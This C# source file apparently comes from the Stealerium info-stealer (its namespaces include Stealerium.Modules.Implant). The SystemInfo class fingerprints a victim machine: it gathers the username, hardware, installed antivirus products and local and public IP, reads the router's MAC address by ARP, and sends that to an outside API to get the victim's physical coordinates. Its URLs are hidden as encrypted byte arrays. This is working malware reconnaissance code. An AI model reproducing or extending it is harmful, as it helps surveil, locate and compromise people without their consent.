using System;
using System.Collections.Generic;
using System.Drawing;
using System.Globalization;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.Win32;
using Stealerium.Helpers;
using Stealerium.Modules.Implant;

namespace Stealerium.Target.System
{
    internal sealed class SystemInfo
    {
        // Username
        public static string Username = Environment.UserName;

        // Computer name
        public static string Compname = Environment.MachineName;

        // Language
        public static string Culture = CultureInfo.CurrentCulture.ToString();

        // Current date
        public static readonly string Datenow = DateTime.Now.ToString("yyyy-MM-dd h:mm:ss tt");

        [DllImport("iphlpapi.dll", ExactSpelling = true)]
        private static extern int SendARP(int destIp, int srcIp, byte[] macAddr, ref uint physicalAddrLen);


        // Get screen metrics
        public static string ScreenMetrics()
        {
            var bounds = Screen.GetBounds(Point.Empty);
            var width = bounds.Width;
            var height = bounds.Height;
            return width + "x" + height;
        }

        // Get battery status
        public static string GetBattery()
        {
            try
            {
                var batteryStatus = SystemInformation.PowerStatus.BatteryChargeStatus.ToString();
                var batteryLife = SystemInformation.PowerStatus.BatteryLifePercent
                    .ToString(CultureInfo.InvariantCulture).Split(',');
                var batteryPercent = batteryLife[batteryLife.Length - 1];
                return $"{batteryStatus} ({batteryPercent}%)";
            }
            catch
            {
                // ignored
            }

            return "Unknown";
        }

        // Get system version
        private static string GetWindowsVersionName()
        {
            var sData = "Unknown System";
            try
            {
                using (var mSearcher =
                       new ManagementObjectSearcher(@"root\CIMV2", " SELECT * FROM win32_operatingsystem"))
                {
                    foreach (var o in mSearcher.Get())
                    {
                        var tObj = (ManagementObject) o;
                        sData = Convert.ToString(tObj["Name"]);
                    }

                    sData = sData.Split('|')[0];
                    var iLen = sData.Split(' ')[0].Length;
                    sData = sData.Substring(iLen).TrimStart().TrimEnd();
                }
            }
            catch
            {
                // ignored
            }

            return sData;
        }

        // Get bit
        private static string GetBitVersion()
        {
            try
            {
                return Registry.LocalMachine.OpenSubKey(@"HARDWARE\Description\System\CentralProcessor\0")
                    .GetValue("Identifier")
                    .ToString()
                    .Contains("x86")
                    ? "(32 Bit)"
                    : "(64 Bit)";
            }
            catch
            {
                // ignored
            }

            return "(Unknown)";
        }

        // Get system version
        public static string GetSystemVersion()
        {
            return GetWindowsVersionName() + " " + GetBitVersion();
        }

        // Get default gateway
        public static string GetDefaultGateway()
        {
            try
            {
                return NetworkInterface
                    .GetAllNetworkInterfaces()
                    .Where(n => n.OperationalStatus == OperationalStatus.Up)
                    .Where(n => n.NetworkInterfaceType != NetworkInterfaceType.Loopback)
                    .SelectMany(n => n.GetIPProperties()?.GatewayAddresses)
                    .Select(g => g?.Address)
                    .Where(a => a != null)
                    .FirstOrDefault()
                    ?.ToString();
            }
            catch
            {
                // ignored
            }

            return "Unknown";
        }

        // Detect antiviruse
        public static string GetAntivirus()
        {
            try
            {
                using (var antiVirusSearch = new ManagementObjectSearcher(
                           @"\\" + Environment.MachineName + @"\root\SecurityCenter2",
                           "Select * from AntivirusProduct"))
                {
                    var av = new List<string>();
                    foreach (var searchResult in antiVirusSearch.Get())
                        av.Add(searchResult["displayName"].ToString());
                    if (av.Count == 0) return "Not installed";
                    return string.Join(", ", av.ToArray()) + ".";
                }
            }
            catch
            {
                // ignored
            }

            return "N/A";
        }

        // Get local IP
        public static string GetLocalIp()
        {
            try
            {
                var host = Dns.GetHostEntry(Dns.GetHostName());
                foreach (var ip in host.AddressList)
                    if (ip.AddressFamily == AddressFamily.InterNetwork)
                        return ip.ToString();
            }
            catch
            {
                // ignored
            }

            return "No network adapters with an IPv4 address in the system!";
        }

        // Get public IP
        public static string GetPublicIp()
        {
            try
            {
                var externalip = new WebClient()
                    .DownloadString(
                        StringsCrypt.Decrypt(new byte[]
                        {
                            23, 61, 220, 157, 111, 249, 43, 180, 122, 28, 107, 102, 60, 187, 44, 39, 44, 238, 221, 5,
                            238, 56, 3, 133, 224, 68, 195, 226, 41, 226, 22, 191
                        })) // http://icanhazip.com
                    .Replace("\n", "");
                return externalip;
            }
            catch (Exception ex)
            {
                Logging.Log("SystemInfo >> GetPublicIP : Request error\n" + ex);
            }

            return "Request failed";
        }

        // Get router BSSID
        private static string GetBssid()
        {
            var macAddr = new byte[6];
            var macAddrLen = (uint) macAddr.Length;
            try
            {
                var ip = GetDefaultGateway();
                if (SendARP(BitConverter.ToInt32(IPAddress.Parse(ip).GetAddressBytes(), 0), 0, macAddr,
                        ref macAddrLen) != 0)
                    return "unknown";

                var v = new string[(int) macAddrLen];
                for (var j = 0; j < macAddrLen; j++)
                    v[j] = macAddr[j].ToString("x2");
                return string.Join(":", v);
            }
            catch
            {
                // ignored
            }

            return "Failed";
        }

        // Get location by BSSID
        // Example API response:
        // {"result":200, "data":{"lat": 45.22172742372, "range": 156.997, "lon": 16.54707889397, "time": 1595238766}}
        public static string GetLocation()
        {
            string response;
            var bssid = GetBssid(); // "00:0C:42:1F:65:E9";
            var lat = "Unknown";
            var lon = "Unknown";
            var range = "Unknown";
            // Get coordinates by bssid
            try
            {
                using (var client = new WebClient())
                {
                    response = client.DownloadString(
                        StringsCrypt.Decrypt(new byte[]
                        {
                            239, 87, 16, 244, 130, 200, 219, 198, 121, 223, 110, 28, 218, 166, 27, 2, 253, 239, 236, 54,
                            11, 159, 146, 91, 205, 36, 0, 49, 166, 93, 22, 23, 221, 210, 170, 52, 17, 123, 35, 113, 33,
                            136, 114, 109, 224, 65, 139, 150, 160, 210, 179, 207, 197, 164, 182, 82, 86, 244, 231, 174,
                            68, 222, 51, 47
                        }) + bssid); // https://api.mylnikov.org/geolocation/wifi?v=1.1&bssid=
                }
            }
            catch
            {
                return "BSSID: " + bssid;
            }

            // If failed to receive BSSID location
            if (!response.Contains("{\"result\":200"))
                return "BSSID: " + bssid;
            // Get values
            var index = 0;
            var splitted = response.Split(' ');
            foreach (var value in splitted)
            {
                index++; // +1
                if (value.Contains("\"lat\":"))
                    lat = splitted[index]
                        .Replace(",", "");
                if (value.Contains("\"lon\":"))
                    lon = splitted[index]
                        .Replace(",", "");
                if (value.Contains("\"range\":"))
                    range = splitted[index]
                        .Replace(",", "");
            }

            var result = $"BSSID: {bssid}\nLatitude: {lat}\nLongitude: {lon}\nRange: {range}";
            // Google maps
            // https://www.google.com.ua/maps/place/
            if (lat != "Unknown" && lon != "Unknown")
                result +=
                    $"\n[Open google maps]({StringsCrypt.Decrypt(new byte[] {59, 129, 195, 34, 227, 242, 76, 173, 34, 247, 140, 112, 238, 245, 161, 60, 49, 127, 57, 59, 227, 89, 70, 152, 32, 242, 56, 102, 234, 75, 63, 18, 228, 223, 4, 147, 131, 146, 214, 158, 87, 69, 119, 232, 58, 195, 55, 105})}{lat} {lon})";

            return result;
        }

        // Get CPU name
        public static string GetCpuName()
        {
            try
            {
                var mSearcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor");
                foreach (var o in mSearcher.Get())
                {
                    var mObject = (ManagementObject) o;
                    return mObject["Name"].ToString();
                }
            }
            catch
            {
                // ignored
            }

            return "Unknown";
        }

        // Get GPU name
        public static string GetGpuName()
        {
            try
            {
                var mSearcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController");
                foreach (var o in mSearcher.Get())
                {
                    var mObject = (ManagementObject) o;
                    return mObject["Name"].ToString();
                }
            }
            catch
            {
                // ignored
            }

            return "Unknown";
        }

        // Get RAM
        public static string GetRamAmount()
        {
            try
            {
                var ramAmount = 0;
                using (var mos = new ManagementObjectSearcher("Select * From Win32_ComputerSystem"))
                {
                    foreach (var o in mos.Get())
                    {
                        var mo = (ManagementObject) o;
                        var bytes = Convert.ToDouble(mo["TotalPhysicalMemory"]);
                        ramAmount = (int) (bytes / 1048576);
                        break;
                    }
                }

                return ramAmount + "MB";
            }
            catch
            {
                // ignored
            }

            return "-1";
        }
    }
}